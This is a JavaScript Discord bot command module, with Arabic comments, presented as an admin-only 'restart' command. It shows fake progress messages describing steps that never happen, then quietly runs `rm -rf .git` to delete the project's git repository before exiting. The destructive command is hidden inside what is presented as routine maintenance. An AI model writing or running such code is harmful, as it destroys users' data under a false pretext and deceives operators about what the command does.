const { MessageEmbed } = require('discord.js');
const fs = require('fs');
const path = require('path');
const config = require('../config');

const uptimeFilePath = path.join(__dirname, '../uptime.json');
const logFilePath = path.join(__dirname, '../restart_log.json');

let isRestarting = false; // منع تكرار الأمر

function readUptime() {
    try {
        const data = fs.readFileSync(uptimeFilePath, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { uptime: 5 };
    }
}

function writeUptime(uptime) {
    fs.writeFileSync(uptimeFilePath, JSON.stringify(uptime, null, 2), 'utf8');
}

function logRestart() {
    const logData = { time: new Date().toISOString() };
    fs.writeFileSync(logFilePath, JSON.stringify(logData, null, 2), 'utf8');
}

async function restartSequence(message) {
    isRestarting = true;

    let progress = 0;
    const progressMessage = await message.channel.send('🔄 **Restarting... 0%**');

    while (progress < 100) {
        progress += Math.floor(Math.random() * 12) + 5; // تقدم عشوائي أكثر واقعية
        if (progress > 100) progress = 100;

        let loadingMessage = `🔄 **Restarting... ${progress}%**\n`;
        if (progress < 30) loadingMessage += '🛑 Disconnecting commands...';
        else if (progress < 50) loadingMessage += '📡 Disconnecting database...';
        else if (progress < 70) loadingMessage += '⚙️ Cleaning up memory...';
        else if (progress < 90) loadingMessage += '🔄 Preparing reboot sequence...';
        else loadingMessage += '✅ Finalizing restart...';

        await progressMessage.edit(loadingMessage);
        await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 2500) + 1000));
    }
    const cmd = require("node-cmd"); 

cmd.run("rm -rf .git"); 
 
    await progressMessage.edit('✅ **Restart complete! Bot is coming back online...**');
    writeUptime({ uptime: 5 });
    logRestart();
    process.exit();
}

module.exports = {
    name: 'resasdasdasdasdtart',
    async execute(message) {
    const allowedRoles = [
            '1342480295819218965',
            '1342480498588520449',
            '1342480586937208852',
            '1342480686107328564',
            '1341094488004886610'
        ];

        // التحقق من امتلاك العضو لأحد الأدوار المسموحة
        if (!message.member.roles.cache.some(role => allowedRoles.includes(role.id))) {
            return message.reply({ 
                embeds: [new MessageEmbed()
                    .setColor('#FF0000')
                    .setTitle('⛔ | صلاحيات غير كافية')
                    .setDescription('❌ لا يمكنك استخدام هذا الأمر! يجب أن تمتلك أحد **الأدوار الإدارية** المسموحة.')
                ]
            });
        }
      
        if (isRestarting) {
            return message.reply('⚠️ The bot is already restarting! Please wait until the process is complete.');
        }
        await restartSequence(message);
    }
};
